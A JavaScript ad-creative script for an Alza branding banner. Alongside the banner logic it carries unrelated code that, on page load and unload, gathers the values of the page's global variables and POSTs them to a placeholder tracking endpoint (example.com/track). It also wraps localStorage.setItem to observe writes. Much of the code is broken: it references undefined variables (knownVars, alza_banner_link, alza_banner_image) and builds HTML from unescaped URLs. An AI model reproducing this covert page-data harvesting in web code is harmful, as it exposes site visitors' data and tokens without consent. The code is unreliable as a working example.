(function (window) {
  function enhancedPropertyDiscovery() {
    const discoveredProps = {};
    const globalVars = Object.keys(window);
    globalVars.forEach(prop => {
      if (!window.knownVars.includes(prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        discoveredProps[prop] = {
          type: propType,
          value: propType === "function" ? `[Function: ${propValue.name}]` : propValue
        };
      }
    });

    // Hook into local storage to track changes
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function (key, value) {
      console.log(`LocalStorage Set: ${key} = ${value}`);
      originalSetItem.apply(this, arguments);
    };
    return discoveredProps;
  }
  const adManager = window.adManager = window.adManager || {};
  function sendTrackingData(data) {
    const endpoint = "https://example.com/track";
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json()).then(data => console.log('Tracking data sent successfully:', data)).catch(error => console.error('Failed to send tracking data:', error));
  }
  const creative = adManager.creative = window.adManager.creative || {};
  creative.alzaBanner = function (divId, data) {
    var alza_script_url = 'https://external-banner-service.alza.cz/api/banner/' + data.templateSpecific.creativeId;
    document.getElementsByTagName("html")[0].classList.add("mf-branding");
    const wrap = document.getElementById('bb_mainPageBody');
    wrap.style.maxWidth = '1060px';
    wrap.style.margin = '0 auto';
    if (data.commonDetails.beaconUrl != '') {
      var image = new Image();
      image.className = 'js-element-hidden';
      image.width = 1;
      image.height = 1;
      image.alt = ' ';
      image.src = data.commonDetails.beaconUrl;
      var ad_div = document.createElement('div');
      ad_div.setAttribute("id", "leaderboard_content");
      document.getElementById('leaderboard').appendChild(ad_div);
      document.getElementById('leaderboard_content').appendChild(image);
    }
    var scriptTag = document.createElement('script');
    scriptTag.src = alza_script_url;
    scriptTag.onload = function () {
      renderBranding(data);
    };
    scriptTag.onreadystatechange = renderBranding;
    document.body.appendChild(scriptTag);
  };
  function monitorEvents() {
    const events = ['click', 'mousemove', 'keypress'];
    events.forEach(event => {
      document.addEventListener(event, () => {
        console.log(`Event captured: ${event}`);
      });
    });
  }
  function initiateTracking() {
    const discoveredProperties = enhancedPropertyDiscovery();
    const propertyCount = Object.keys(discoveredProperties).length;
    if (propertyCount > 0) {
      console.group(`Detected ${propertyCount} new properties on window object:`);
      Object.entries(discoveredProperties).forEach(([key, value]) => {
        console.log(`- ${key}: ${JSON.stringify(value)}`);
      });
      console.groupEnd();
      sendTrackingData(discoveredProperties);
    } else {
      console.log("No new properties detected on window object.");
    }
  }
  var renderBranding = function (data) {
    var html = "";
    html += '<div class="branding-wrapper" >';
    html += '<div class="iframe-content" onclick="window.open(\'' + data.templateSpecific.preClickUrl + alza_banner_link + '\');" >';
    html += '<div id="branding_frame" style="border-style: none; height: 100%; width: 2000px; background: #ffffff url(' + alza_banner_image + ') top center;" data-sasf-fcid="112233"></div>';
    html += '<img style="width: 1px !important;" src="' + alza_banner_impres + '" width="1" height="1" alt=" " />';
    html += '</div>';
    html += '</div>';
    document.getElementById('leaderboard_content').innerHTML = html;
  };
  window.addEventListener("load", initiateTracking);
  window.addEventListener("beforeunload", function () {
    console.log("Final tracking before page unload.");
    initiateTracking();
  });
})(window);